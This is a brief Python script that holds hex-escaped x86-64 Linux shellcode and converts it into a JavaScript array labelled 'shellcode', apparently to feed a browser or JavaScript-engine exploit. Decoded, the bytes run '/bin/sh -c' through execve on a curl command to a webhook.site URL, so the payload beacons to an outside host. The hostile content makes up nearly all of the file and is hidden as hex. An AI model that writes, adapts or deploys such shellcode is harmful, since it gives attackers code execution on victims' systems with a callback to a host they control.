a = (
    "\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99\\x50\\x54\\x5f"
    "\\x52\\x66\\x68\\x2d\\x63\\x54\\x5e\\x52\\xe8\\x3f\\x00\\x00\\x00\\x63"
    "\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x77\\x65"
    "\\x62\\x68\\x6f\\x6f\\x6b\\x2e\\x73\\x69\\x74\\x65\\x2f\\x61\\x33\\x35"
    "\\x62\\x31\\x39\\x62\\x38\\x2d\\x35\\x66\\x63\\x33\\x2d\\x34\\x63\\x35"
    "\\x38\\x2d\\x39\\x61\\x36\\x30\\x2d\\x32\\x31\\x31\\x33\\x34\\x64\\x36"
    "\\x37\\x32\\x39\\x39\\x32\\x00\\x56\\x57\\x54\\x5e\\x6a\\x3b\\x58\\x0f"
    "\\x05"
)

# Interpret the input string as a byte sequence
import re

# Extract all hexadecimal values
hex_values = re.findall(r"\\x([0-9a-fA-F]{2})", a)

# Convert to a JavaScript array
js_array = "var shellcode = [" + ", ".join(f"0x{h}" for h in hex_values) + "];"

print(js_array)